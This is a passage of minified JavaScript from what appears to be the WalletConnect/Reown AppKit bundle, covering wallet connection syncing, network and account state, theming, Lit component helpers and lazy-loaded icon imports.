Promise.all(this.chainNamespaces.map(async e=>{await this.initChainAdapter(e)}))}onConnectors(e){var r;(r=this.getAdapter(e))==null||r.on("connectors",this.setConnectors.bind(this))}listenAdapter(e){const r=this.getAdapter(e);if(!r)return;const n=pe.getConnectionStatus();n==="connected"?this.setStatus("connecting",e):n==="disconnected"?(pe.clearAddressCache(),this.setStatus(n,e)):this.setStatus(n,e),r.on("switchNetwork",({address:i,chainId:s})=>{const o=this.getCaipNetworks().find(l=>l.id===s||l.caipNetworkId===s),a=B.state.activeChain===e,c=B.getAccountProp("address",e);if(o){const l=a&&i?i:c;l&&this.syncAccount({address:l,chainId:o.id,chainNamespace:e})}else this.setUnsupportedNetwork(s)}),r.on("disconnect",this.disconnect.bind(this,e)),r.on("pendingTransactions",()=>{const i=me.state.address,s=B.state.activeCaipNetwork;!i||!(s!=null&&s.id)||this.updateNativeBalance(i,s.id,s.chainNamespace)}),r.on("accountChanged",({address:i,chainId:s})=>{var a,c;const o=B.state.activeChain===e;o&&s?this.syncAccount({address:i,chainId:s,chainNamespace:e}):o&&((a=B.state.activeCaipNetwork)!=null&&a.id)?this.syncAccount({address:i,chainId:(c=B.state.activeCaipNetwork)==null?void 0:c.id,chainNamespace:e}):this.syncAccountInfo(i,s,e)})}async createUniversalProviderForAdapter(e){var r,n,i;await this.getUniversalProvider(),this.universalProvider&&((i=(n=(r=this.chainAdapters)==null?void 0:r[e])==null?void 0:n.setUniversalProvider)==null||i.call(n,this.universalProvider))}async syncExistingConnection(){await Promise.allSettled(this.chainNamespaces.map(e=>this.syncNamespaceConnection(e)))}async syncNamespaceConnection(e){try{const r=ae.getConnectorId(e);switch(this.setStatus("connecting",e),r){case ve.CONNECTOR_ID.WALLET_CONNECT:await this.syncWalletConnectAccount();break;case ve.CONNECTOR_ID.AUTH:break;default:await this.syncAdapterConnection(e)}}catch(r){console.warn("AppKit couldn't sync existing connection",r),this.setStatus("disconnected",e)}}async syncAdapterConnection(e){var o,a,c;const r=this.getAdapter(e),n=ae.getConnectorId(e),i=this.getCaipNetwork(e),s=ae.getConnectors(e).find(l=>l.id===n);try{if(!r||!s)throw new Error(`Adapter or connector not found for namespace ${e}`);if(!(i!=null&&i.id))throw new Error("CaipNetwork not found");const l=await(r==null?void 0:r.syncConnection({namespace:e,id:s.id,chainId:i.id,rpcUrl:(c=(a=(o=i==null?void 0:i.rpcUrls)==null?void 0:o.default)==null?void 0:a.http)==null?void 0:c[0]}));if(l){const u=await(r==null?void 0:r.getAccounts({namespace:e,id:s.id}));u&&u.accounts.length>0?this.setAllAccounts(u.accounts,e):this.setAllAccounts([te.createAccount(e,l.address,"eoa")],e),this.syncProvider({...l,chainNamespace:e}),await this.syncAccount({...l,chainNamespace:e}),this.setStatus("connected",e)}else this.setStatus("disconnected",e)}catch{this.setStatus("disconnected",e)}}async syncWalletConnectAccount(){const e=this.chainNamespaces.map(async r=>{var a,c,l,u,h;const n=this.getAdapter(r),i=((u=(l=(c=(a=this.universalProvider)==null?void 0:a.session)==null?void 0:c.namespaces)==null?void 0:l[r])==null?void 0:u.accounts)||[],s=(h=B.state.activeCaipNetwork)==null?void 0:h.id,o=i.find(d=>{const{chainId:f}=Js.parseCaipAddress(d);return f===(s==null?void 0:s.toString())})||i[0];if(o){const d=Js.validateCaipAddress(o),{chainId:f,address:g}=Js.parseCaipAddress(d);if(bt.setProviderId(r,oo.CONNECTOR_TYPE_WALLET_CONNECT),this.caipNetworks&&B.state.activeCaipNetwork&&(n==null?void 0:n.namespace)!==ve.CHAIN.EVM){const p=n==null?void 0:n.getWalletConnectProvider({caipNetworks:this.getCaipNetworks(),provider:this.universalProvider,activeCaipNetwork:B.state.activeCaipNetwork});bt.setProvider(r,p)}else bt.setProvider(r,this.universalProvider);ae.setConnectorId(ve.CONNECTOR_ID.WALLET_CONNECT,r),pe.addConnectedNamespace(r),this.syncWalletConnectAccounts(r),await this.syncAccount({address:g,chainId:f,chainNamespace:r})}else this.setStatus("disconnected",r);await B.setApprovedCaipNetworksData(r)});await Promise.all(e)}syncWalletConnectAccounts(e){var n,i,s,o,a;const r=(a=(o=(s=(i=(n=this.universalProvider)==null?void 0:n.session)==null?void 0:i.namespaces)==null?void 0:s[e])==null?void 0:o.accounts)==null?void 0:a.map(c=>{const{address:l}=Js.parseCaipAddress(c);return l}).filter((c,l,u)=>u.indexOf(c)===l);r&&this.setAllAccounts(r.map(c=>te.createAccount(e,c,e==="bip122"?"payment":"eoa")),e)}syncProvider({type:e,provider:r,id:n,chainNamespace:i}){bt.setProviderId(i,e),bt.setProvider(i,r),ae.setConnectorId(n,i)}async syncAccount(e){var h,d;const r=e.chainNamespace===B.state.activeChain,n=B.getCaipNetworkByNamespace(e.chainNamespace,e.chainId),{address:i,chainId:s,chainNamespace:o}=e,{chainId:a}=pe.getActiveNetworkProps(),c=s||a,l=((h=B.state.activeCaipNetwork)==null?void 0:h.name)===ve.UNSUPPORTED_NETWORK_NAME,u=B.getNetworkProp("supportsAllNetworks",o);if(this.setStatus("connected",o),!(l&&!u)&&c){let f=this.getCaipNetworks().find(w=>w.id.toString()===c.toString()),g=this.getCaipNetworks().find(w=>w.chainNamespace===o);if(!u&&!f&&!g){const w=this.getApprovedCaipNetworkIds()||[],m=w.find(v=>{var x;return((x=Js.parseCaipNetworkId(v))==null?void 0:x.chainId)===c.toString()}),b=w.find(v=>{var x;return((x=Js.parseCaipNetworkId(v))==null?void 0:x.chainNamespace)===o});f=this.getCaipNetworks().find(v=>v.caipNetworkId===m),g=this.getCaipNetworks().find(v=>v.caipNetworkId===b||"deprecatedCaipNetworkId"in v&&v.deprecatedCaipNetworkId===b)}const p=f||g;(p==null?void 0:p.chainNamespace)===B.state.activeChain?Y.state.enableNetworkSwitch&&!Y.state.allowUnsupportedChain&&((d=B.state.activeCaipNetwork)==null?void 0:d.name)===ve.UNSUPPORTED_NETWORK_NAME?B.showUnsupportedChainUI():this.setCaipNetwork(p):r||n&&this.setCaipNetworkOfNamespace(n,o),this.syncConnectedWalletInfo(o),w2.isLowerCaseMatch(i,me.state.address)||this.syncAccountInfo(i,p==null?void 0:p.id,o),r?await this.syncBalance({address:i,chainId:p==null?void 0:p.id,chainNamespace:o}):await this.syncBalance({address:i,chainId:n==null?void 0:n.id,chainNamespace:o})}}async syncAccountInfo(e,r,n){const i=this.getCaipAddress(n),s=r||(i==null?void 0:i.split(":")[1]);if(!s)return;const o=`${n}:${s}:${e}`;this.setCaipAddress(o,n),await this.syncIdentity({address:e,chainId:s,chainNamespace:n})}async syncReownName(e,r){try{const n=await this.getReownName(e);if(n[0]){const i=n[0];this.setProfileName(i.name,r)}else this.setProfileName(null,r)}catch{this.setProfileName(null,r)}}syncConnectedWalletInfo(e){var i;const r=ae.getConnectorId(e),n=bt.getProviderId(e);if(n===oo.CONNECTOR_TYPE_ANNOUNCED||n===oo.CONNECTOR_TYPE_INJECTED){if(r){const s=this.getConnectors().find(o=>o.id===r);if(s){const{info:o,name:a,imageUrl:c}=s,l=c||this.getConnectorImage(s);this.setConnectedWalletInfo({name:a,icon:l,...o},e)}}}else if(n===oo.CONNECTOR_TYPE_WALLET_CONNECT){const s=bt.getProvider(e);s!=null&&s.session&&this.setConnectedWalletInfo({...s.session.peer.metadata,name:s.session.peer.metadata.name,icon:(i=s.session.peer.metadata.icons)==null?void 0:i[0]},e)}else if(r)if(r===ve.CONNECTOR_ID.COINBASE){const s=this.getConnectors().find(o=>o.id===ve.CONNECTOR_ID.COINBASE);this.setConnectedWalletInfo({name:"Coinbase Wallet",icon:this.getConnectorImage(s)},e)}else this.setConnectedWalletInfo({name:r},e)}async syncBalance(e){!yA.getNetworksByNamespace(this.getCaipNetworks(),e.chainNamespace).find(r=>{var n;return r.id.toString()===((n=e.chainId)==null?void 0:n.toString())})||!e.chainId||await this.updateNativeBalance(e.address,e.chainId,e.chainNamespace)}async updateNativeBalance(e,r,n){const i=this.getAdapter(n),s=B.getCaipNetworkByNamespace(n,r);if(i){const o=await i.getBalance({address:e,chainId:r,caipNetwork:s,tokens:this.options.tokens});this.setBalance(o.balance,o.symbol,n)}}async initializeUniversalAdapter(){var n,i,s,o,a,c,l,u,h,d;const e=yW.createLogger((f,...g)=>{f&&this.handleAlertError(f),console.error(...g)}),r={projectId:(n=this.options)==null?void 0:n.projectId,metadata:{name:(i=this.options)!=null&&i.metadata?(s=this.options)==null?void 0:s.metadata.name:"",description:(o=this.options)!=null&&o.metadata?(a=this.options)==null?void 0:a.metadata.description:"",url:(c=this.options)!=null&&c.metadata?(l=this.options)==null?void 0:l.metadata.url:"",icons:(u=this.options)!=null&&u.metadata?(h=this.options)==null?void 0:h.metadata.icons:[""]},logger:e};Y.setManualWCControl(!!((d=this.options)!=null&&d.manualWCControl)),this.universalProvider=this.options.universalProvider??await t1.init(r),this.listenWalletConnect()}listenWalletConnect(){this.universalProvider&&(this.universalProvider.on("display_uri",e=>{we.setUri(e)}),this.universalProvider.on("connect",we.finalizeWcConnection),this.universalProvider.on("disconnect",()=>{this.chainNamespaces.forEach(e=>{this.resetAccount(e)}),we.resetWcConnection()}),this.universalProvider.on("chainChanged",e=>{const r=this.getCaipNetworks().find(i=>i.id==e),n=this.getCaipNetwork();if(!r){this.setUnsupportedNetwork(e);return}(n==null?void 0:n.id)!==(r==null?void 0:r.id)&&this.setCaipNetwork(r)}),this.universalProvider.on("session_event",e=>{if(P9.isSessionEventData(e)){const{name:r,data:n}=e.params.event;r==="accountsChanged"&&Array.isArray(n)&&te.isCaipAddress(n[0])&&this.syncAccount(Js.parseCaipAddress(n[0]))}}))}createUniversalProvider(){var e;return!this.universalProviderInitPromise&&te.isClient()&&((e=this.options)!=null&&e.projectId)&&(this.universalProviderInitPromise=this.initializeUniversalAdapter()),this.universalProviderInitPromise}async getUniversalProvider(){if(!this.universalProvider)try{await this.createUniversalProvider()}catch(e){De.sendEvent({type:"error",event:"INTERNAL_SDK_ERROR",properties:{errorType:"UniversalProviderInitError",errorMessage:e instanceof Error?e.message:"Unknown",uncaught:!1}}),console.error("AppKit:getUniversalProvider - Cannot create provider",e)}return this.universalProvider}handleAlertError(e){const r=Object.entries(Mp.UniversalProviderErrors).find(([,{message:a}])=>e.message.includes(a)),[n,i]=r??[],{message:s,alertErrorKey:o}=i??{};if(n&&s&&!this.reportedAlertErrors[n]){const a=Mp.ALERT_ERRORS[o];a&&(Lo.open(a,"error"),this.reportedAlertErrors[n]=!0)}}getAdapter(e){var r;if(e)return(r=this.chainAdapters)==null?void 0:r[e]}createAdapter(e){var i;if(!e)return;const r=e.namespace;if(!r)return;this.createClients();const n=e;n.namespace=r,n.construct({namespace:r,projectId:(i=this.options)==null?void 0:i.projectId,networks:this.getCaipNetworks()}),this.chainNamespaces.includes(r)||this.chainNamespaces.push(r),this.chainAdapters&&(this.chainAdapters[r]=n)}async open(e){if(await this.injectModalUi(),e!=null&&e.uri&&we.setUri(e.uri),e==null?void 0:e.arguments)switch(e==null?void 0:e.view){case"Swap":return qe.open({...e,data:{swap:e.arguments}})}return qe.open(e)}async close(){await this.injectModalUi(),qe.close()}setLoading(e,r){qe.setLoading(e,r)}async disconnect(e){await we.disconnect(e)}getError(){return""}getChainId(){var e;return(e=B.state.activeCaipNetwork)==null?void 0:e.id}async switchNetwork(e){const r=this.getCaipNetworks().find(n=>n.id===e.id);if(!r){Lo.open(Mp.ALERT_ERRORS.SWITCH_NETWORK_NOT_FOUND,"error");return}await B.switchActiveNetwork(r)}getWalletProvider(){return B.state.activeChain?bt.state.providers[B.state.activeChain]:null}getWalletProviderType(){return bt.getProviderId(B.state.activeChain)}subscribeProviders(e){return bt.subscribeProviders(e)}getThemeMode(){return Bt.state.themeMode}getThemeVariables(){return Bt.state.themeVariables}setThemeMode(e){Bt.setThemeMode(e),S9(Bt.state.themeMode)}setTermsConditionsUrl(e){Y.setTermsConditionsUrl(e)}setPrivacyPolicyUrl(e){Y.setPrivacyPolicyUrl(e)}setThemeVariables(e){Bt.setThemeVariables(e),UW(Bt.state.themeVariables)}subscribeTheme(e){return Bt.subscribe(e)}getWalletInfo(){return me.state.connectedWalletInfo}getAccount(e){var s;const r=ae.getAuthConnector(e),n=B.getAccountData(e),i=B.state.activeChain;if(n)return{allAccounts:n.allAccounts,caipAddress:n.caipAddress,address:te.getPlainAddress(n.caipAddress),isConnected:!!n.caipAddress,status:n.status,embeddedWalletInfo:r?{user:n.user?{...n.user,username:pe.getConnectedSocialUsername()}:void 0,authProvider:n.socialProvider||"email",accountType:(s=n.preferredAccountTypes)==null?void 0:s[e||i],isSmartAccountDeployed:!!n.smartAccountDeployed}:void 0}}subscribeAccount(e,r){const n=()=>{const i=this.getAccount(r);i&&e(i)};r?B.subscribeChainProp("accountState",n,r):B.subscribe(n),ae.subscribe(n)}subscribeNetwork(e){return B.subscribe(({activeCaipNetwork:r})=>{e({caipNetwork:r,chainId:r==null?void 0:r.id,caipNetworkId:r==null?void 0:r.caipNetworkId})})}subscribeWalletInfo(e){return me.subscribeKey("connectedWalletInfo",e)}subscribeShouldUpdateToAddress(e){me.subscribeKey("shouldUpdateToAddress",e)}subscribeCaipNetworkChange(e){B.subscribeKey("activeCaipNetwork",e)}getState(){return Us.state}subscribeState(e){return Us.subscribe(e)}showErrorMessage(e){ut.showError(e)}showSuccessMessage(e){ut.showSuccess(e)}getEvent(){return{...De.state}}subscribeEvents(e){return De.subscribe(e)}replace(e){se.replace(e)}redirect(e){se.push(e)}popTransactionStack(e){se.popTransactionStack(e)}isOpen(){return qe.state.open}isTransactionStackEmpty(){return se.state.transactionStack.length===0}isTransactionShouldReplaceView(){var e;return(e=se.state.transactionStack[se.state.transactionStack.length-1])==null?void 0:e.replace}static getInstance(){return this.instance}updateFeatures(e){Y.setFeatures(e)}updateOptions(e){const r={...Y.state||{},...e};Y.setOptions(r)}setConnectMethodsOrder(e){Y.setConnectMethodsOrder(e)}setWalletFeaturesOrder(e){Y.setWalletFeaturesOrder(e)}setCollapseWallets(e){Y.setCollapseWallets(e)}setSocialsOrder(e){Y.setSocialsOrder(e)}getConnectMethodsOrder(){return Nc.getConnectOrderMethod(Y.state.features,ae.getConnectors())}addNetwork(e,r){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);const n=this.extendCaipNetwork(r,this.options);this.getCaipNetworks().find(i=>i.id===n.id)||B.addNetwork(n)}removeNetwork(e,r){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);this.getCaipNetworks().find(n=>n.id===r)&&B.removeNetwork(e,r)}}let r8=!1;class O9 extends rG{async open(e){ae.isConnected()||await super.open(e)}async close(){await super.close(),this.options.manualWCControl&&we.finalizeWcConnection()}async syncIdentity(e){return Promise.resolve()}async syncBalance(e){return Promise.resolve()}async injectModalUi(){if(!r8&&te.isClient()){if(await Promise.resolve().then(function(){return pZ}),await Promise.resolve().then(function(){return OZ}),!document.querySelector("w3m-modal")){const e=document.createElement("w3m-modal");!Y.state.disableAppend&&!Y.state.enableEmbedded&&document.body.insertAdjacentElement("beforeend",e)}r8=!0}}}const nG="1.7.3";function iG(t){return new O9({...t,basic:!0,sdkVersion:`html-core-${nG}`})}var sG=Object.freeze({__proto__:null,createAppKit:iG,AppKit:O9}),oG=Object.defineProperty,aG=Object.defineProperties,cG=Object.getOwnPropertyDescriptors,n8=Object.getOwnPropertySymbols,lG=Object.prototype.hasOwnProperty,uG=Object.prototype.propertyIsEnumerable,i8=(t,e,r)=>e in t?oG(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,hG=(t,e)=>{for(var r in e||(e={}))lG.call(e,r)&&i8(t,r,e[r]);if(n8)for(var r of n8(e))uG.call(e,r)&&i8(t,r,e[r]);return t},dG=(t,e)=>aG(t,cG(e));function fG(t){if(t)return{"--w3m-font-family":t["--wcm-font-family"],"--w3m-accent":t["--wcm-accent-color"],"--w3m-color-mix":t["--wcm-background-color"],"--w3m-z-index":t["--wcm-z-index"]?Number(t["--wcm-z-index"]):void 0,"--w3m-qr-color":t["--wcm-accent-color"],"--w3m-font-size-master":t["--wcm-text-medium-regular-size"],"--w3m-border-radius-master":t["--wcm-container-border-radius"],"--w3m-color-mix-strength":0}}const pG=t=>{const[e,r]=t.split(":");return Vl({id:r,caipNetworkId:t,chainNamespace:e,name:"",nativeCurrency:{name:"",symbol:"",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}}})};function gG(t){var e,r,n,i,s,o,a;const c=(e=t.chains)==null?void 0:e.map(pG).filter(Boolean);if(c.length===0)throw new Error("At least one chain must be specified");const l=c.find(h=>{var d;return h.id===((d=t.defaultChain)==null?void 0:d.id)}),u={projectId:t.projectId,networks:c,themeMode:t.themeMode,themeVariables:fG(t.themeVariables),chainImages:t.chainImages,connectorImages:t.walletImages,defaultNetwork:l,metadata:dG(hG({},t.metadata),{name:((r=t.metadata)==null?void 0:r.name)||"WalletConnect",description:((n=t.metadata)==null?void 0:n.description)||"Connect to WalletConnect-compatible wallets",url:((i=t.metadata)==null?void 0:i.url)||"https://walletconnect.org",icons:((s=t.metadata)==null?void 0:s.icons)||["https://walletconnect.org/walletconnect-logo.png"]}),showWallets:!0,featuredWalletIds:t.explorerRecommendedWalletIds==="NONE"?[]:Array.isArray(t.explorerRecommendedWalletIds)?t.explorerRecommendedWalletIds:[],excludeWalletIds:t.explorerExcludedWalletIds==="ALL"?[]:Array.isArray(t.explorerExcludedWalletIds)?t.explorerExcludedWalletIds:[],enableEIP6963:!1,enableInjected:!1,enableCoinbase:!0,enableWalletConnect:!0,features:{email:!1,socials:!1}};if((o=t.mobileWallets)!=null&&o.length||(a=t.desktopWallets)!=null&&a.length){const h=[...(t.mobileWallets||[]).map(g=>({id:g.id,name:g.name,links:g.links})),...(t.desktopWallets||[]).map(g=>({id:g.id,name:g.name,links:{native:g.links.native,universal:g.links.universal}}))],d=[...u.featuredWalletIds||[],...u.excludeWalletIds||[]],f=h.filter(g=>!d.includes(g.id));f.length&&(u.customWallets=f)}return u}var wG=Object.freeze({__proto__:null,convertWCMToAppKitOptions:gG});/**
* @license
* Copyright 2017 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const mG={attribute:!0,type:String,converter:fg,reflect:!1,hasChanged:v2},yG=(t=mG,e,r)=>{const{kind:n,metadata:i}=r;let s=globalThis.litPropertyMetadata.get(i);if(s===void 0&&globalThis.litPropertyMetadata.set(i,s=new Map),n==="setter"&&((t=Object.create(t)).wrapped=!0),s.set(r.name,t),n==="accessor"){const{name:o}=r;return{set(a){const c=e.get.call(this);e.set.call(this,a),this.requestUpdate(o,c,t)},init(a){return a!==void 0&&this.C(o,void 0,t,a),a}}}if(n==="setter"){const{name:o}=r;return function(a){const c=this[o];e.call(this,a),this.requestUpdate(o,c,t)}}throw Error("Unsupported decorator location: "+n)};function F(t){return(e,r)=>typeof r=="object"?yG(t,e,r):((n,i,s)=>{const o=i.hasOwnProperty(s);return i.constructor.createProperty(s,n),o?Object.getOwnPropertyDescriptor(i,s):void 0})(t,e,r)}/**
* @license
* Copyright 2017 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/function le(t){return F({...t,state:!0,attribute:!1})}var bG=Ae`
  :host {
    display: flex;
    width: inherit;
    height: inherit;
  }
`,rn=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let vr=class extends fe{render(){return this.style.cssText=`
      flex-direction: ${this.flexDirection};
      flex-wrap: ${this.flexWrap};
      flex-basis: ${this.flexBasis};
      flex-grow: ${this.flexGrow};
      flex-shrink: ${this.flexShrink};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};
      padding-top: ${this.padding&&Wt.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Wt.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Wt.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Wt.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Wt.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Wt.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Wt.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Wt.getSpacingStyles(this.margin,3)};
    `,U`<slot></slot>`}};vr.styles=[Qe,bG],rn([F()],vr.prototype,"flexDirection",void 0),rn([F()],vr.prototype,"flexWrap",void 0),rn([F()],vr.prototype,"flexBasis",void 0),rn([F()],vr.prototype,"flexGrow",void 0),rn([F()],vr.prototype,"flexShrink",void 0),rn([F()],vr.prototype,"alignItems",void 0),rn([F()],vr.prototype,"justifyContent",void 0),rn([F()],vr.prototype,"columnGap",void 0),rn([F()],vr.prototype,"rowGap",void 0),rn([F()],vr.prototype,"gap",void 0),rn([F()],vr.prototype,"padding",void 0),rn([F()],vr.prototype,"margin",void 0),vr=rn([he("wui-flex")],vr);/**
* @license
* Copyright 2018 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const Ee=t=>t??Nt;/**
* @license
* Copyright 2020 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const vG=t=>t===null||typeof t!="object"&&typeof t!="function",EG=t=>t.strings===void 0;/**
* @license
* Copyright 2017 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const _9={ATTRIBUTE:1,CHILD:2},C2=t=>(...e)=>({_$litDirective$:t,values:e});class T9{constructor(e){}get _$AU(){return this._$AM._$AU}_$AT(e,r,n){this._$Ct=e,this._$AM=r,this._$Ci=n}_$AS(e,r){return this.update(e,r)}update(e,r){return this.render(...r)}}/**
* @license
* Copyright 2017 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const kd=(t,e)=>{var n;const r=t._$AN;if(r===void 0)return!1;for(const i of r)(n=i._$AO)==null||n.call(i,e,!1),kd(i,e);return!0},gg=t=>{let e,r;do{if((e=t._$AM)===void 0)break;r=e._$AN,r.delete(t),t=e}while((r==null?void 0:r.size)===0)},$9=t=>{for(let e;e=t._$AM;t=e){let r=e._$AN;if(r===void 0)e._$AN=r=new Set;else if(r.has(t))break;r.add(t),xG(e)}};function CG(t){this._$AN!==void 0?(gg(this),this._$AM=t,$9(this)):this._$AM=t}function AG(t,e=!1,r=0){const n=this._$AH,i=this._$AN;if(i!==void 0&&i.size!==0)if(e)if(Array.isArray(n))for(let s=r;s<n.length;s++)kd(n[s],!1),gg(n[s]);else n!=null&&(kd(n,!1),gg(n));else kd(this,t)}const xG=t=>{t.type==_9.CHILD&&(t._$AP??(t._$AP=AG),t._$AQ??(t._$AQ=CG))};class R9 extends T9{constructor(){super(...arguments),this._$AN=void 0}_$AT(e,r,n){super._$AT(e,r,n),$9(this),this.isConnected=e._$AU}_$AO(e,r=!0){var n,i;e!==this.isConnected&&(this.isConnected=e,e?(n=this.reconnected)==null||n.call(this):(i=this.disconnected)==null||i.call(this)),r&&(kd(this,e),gg(this))}setValue(e){if(EG(this._$Ct))this._$Ct._$AI(e,this);else{const r=[...this._$Ct._$AH];r[this._$Ci]=e,this._$Ct._$AI(r,this,0)}}disconnected(){}reconnected(){}}/**
* @license
* Copyright 2021 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/class IG{constructor(e){this.G=e}disconnect(){this.G=void 0}reconnect(e){this.G=e}deref(){return this.G}}class SG{constructor(){this.Y=void 0,this.Z=void 0}get(){return this.Y}pause(){this.Y??(this.Y=new Promise(e=>this.Z=e))}resume(){var e;(e=this.Z)==null||e.call(this),this.Y=this.Z=void 0}}/**
* @license
* Copyright 2017 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const s8=t=>!vG(t)&&typeof t.then=="function",o8=1073741823;class NG extends R9{constructor(){super(...arguments),this._$Cwt=o8,this._$Cbt=[],this._$CK=new IG(this),this._$CX=new SG}render(...e){return e.find(r=>!s8(r))??Hs}update(e,r){const n=this._$Cbt;let i=n.length;this._$Cbt=r;const s=this._$CK,o=this._$CX;this.isConnected||this.disconnected();for(let a=0;a<r.length&&!(a>this._$Cwt);a++){const c=r[a];if(!s8(c))return this._$Cwt=a,c;a<i&&c===n[a]||(this._$Cwt=o8,i=0,Promise.resolve(c).then(async l=>{for(;o.get();)await o.get();const u=s.deref();if(u!==void 0){const h=u._$Cbt.indexOf(c);h>-1&&h<u._$Cwt&&(u._$Cwt=h,u.setValue(l))}}))}return Hs}disconnected(){this._$CK.disconnect(),this._$CX.pause()}reconnected(){this._$CK.reconnect(this),this._$CX.resume()}}const PG=C2(NG);class kG{constructor(){this.cache=new Map}set(e,r){this.cache.set(e,r)}get(e){return this.cache.get(e)}has(e){return this.cache.has(e)}delete(e){this.cache.delete(e)}clear(){this.cache.clear()}}const Gw=new kG;var OG=Ae`
  :host {
    display: flex;
    aspect-ratio: var(--local-aspect-ratio);
    color: var(--local-color);
    width: var(--local-width);
  }

  svg {
    width: inherit;
    height: inherit;
    object-fit: contain;
    object-position: center;
  }

  .fallback {
    width: var(--local-width);
    height: var(--local-height);
  }
`,Bh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const a8={add:async()=>(await Promise.resolve().then(function(){return TZ})).addSvg,allWallets:async()=>(await Promise.resolve().then(function(){return RZ})).allWalletsSvg,arrowBottomCircle:async()=>(await Promise.resolve().then(function(){return BZ})).arrowBottomCircleSvg,appStore:async()=>(await Promise.resolve().then(function(){return UZ})).appStoreSvg,apple:async()=>(await Promise.resolve().then(function(){return FZ})).appleSvg,arrowBottom:async()=>(await Promise.resolve().then(function(){return jZ})).arrowBottomSvg,arrowLeft:async()=>(await Promise.resolve().then(function(){return qZ})).arrowLeftSvg,arrowRight:async()=>(await Promise.resolve().then(function(){return WZ})).arrowRightSvg,arrowTop:async()=>(await Promise.resolve().then(function(){return KZ})).arrowTopSvg,bank:async()=>(await Promise.resolve().then(function(){return JZ})).bankSvg,browser:async()=>(await Promise.resolve().then(function(){return YZ})).browserSvg,card:async()=>(await Promise.resolve().then(function(){return eJ})).cardSvg,checkmark:async()=>(await Promise.resolve().then(function(){return rJ})).checkmarkSvg,checkmarkBold:async()=>(await Promise.resolve().then(function(){return iJ})).checkmarkBoldSvg,chevronBottom:async()=>(await Promise.resolve().then(function(){return oJ})).chevronBottomSvg,chevronLeft:async()=>(await Promise.resolve().then(function(){return cJ})).chevronLeftSvg,chevronRight:async()=>(await Promise.resolve().then(function(){return uJ})).chevronRightSvg,chevronTop:async()=>(await Promise.resolve().then(function(){return dJ})).chevronTopSvg,chromeStore:async()=>(await Promise.resolve().then(function(){return pJ})).chromeStoreSvg,clock:async()=>(await Promise.resolve().then(function(){return wJ})).clockSvg,close:async()=>(await Promise.resolve().then(function(){return yJ})).closeSvg,compass:async()=>(await Promise.resolve().then(function(){return vJ})).compassSvg,coinPlaceholder:async()=>(await Promise.resolve().then(function(){return CJ})).coinPlaceholderSvg,copy:async()=>(await Promise.resolve().then(function(){return xJ})).copySvg,cursor:async()=>(await Promise.resolve().then(function(){return SJ})).cursorSvg,cursorTransparent:async()=>(await Promise.resolve().then(function(){return PJ})).cursorTransparentSvg,desktop:async()=>(await Promise.resolve().then(function(){return OJ})).desktopSvg,disconnect:async()=>(await Promise.resolve().then(function(){return TJ})).disconnectSvg,discord:async()=>(await Promise.resolve().then(function(){return RJ})).discordSvg,etherscan:async()=>(await Promise.resolve().then(function(){return BJ})).etherscanSvg,extension:async()=>(await Promise.resolve().then(function(){return UJ})).extensionSvg,externalLink:async()=>(await Promise.resolve().then(function(){return FJ})).externalLinkSvg,facebook:async()=>(await Promise.resolve().then(function(){return jJ})).facebookSvg,farcaster:async()=>(await Promise.resolve().then(function(){return qJ})).farcasterSvg,filters:async()=>(await Promise.resolve().then(function(){return WJ})).filtersSvg,github:async()=>(await Promise.resolve().then(function(){return KJ})).githubSvg,google:async()=>(await Promise.resolve().then(function(){return JJ})).googleSvg,helpCircle:async()=>(await Promise.resolve().then(function(){return YJ})).helpCircleSvg,image:async()=>(await Promise.resolve().then(function(){return eQ})).imageSvg,id:async()=>(await Promise.resolve().then(function(){return rQ})).idSvg,infoCircle:async()=>(await Promise.resolve().then(function(){return iQ})).infoCircleSvg,lightbulb:async()=>(await Promise.resolve().then(function(){return oQ})).lightbulbSvg,mail:async()=>(await Promise.resolve().then(function(){return cQ})).mailSvg,mobile:async()=>(await Promise.resolve().then(function(){return uQ})).mobileSvg,more:async()=>(await Promise.resolve().then(function(){return dQ})).moreSvg,networkPlaceholder:async()=>(await Promise.resolve().then(function(){return pQ})).networkPlaceholderSvg,nftPlaceholder:async()=>(await Promise.resolve().then(function(){return wQ})).nftPlaceholderSvg,off:async()=>(await Promise.resolve().then(function(){return yQ})).offSvg,playStore:async()=>(await Promise.resolve().then(function(){return vQ})).playStoreSvg,plus:async()=>(await Promise.resolve().then(function(){return CQ})).plusSvg,qrCode:async()=>(await Promise.resolve().then(function(){return xQ})).qrCodeIcon,recycleHorizontal:async()=>(await Promise.resolve().then(function(){return 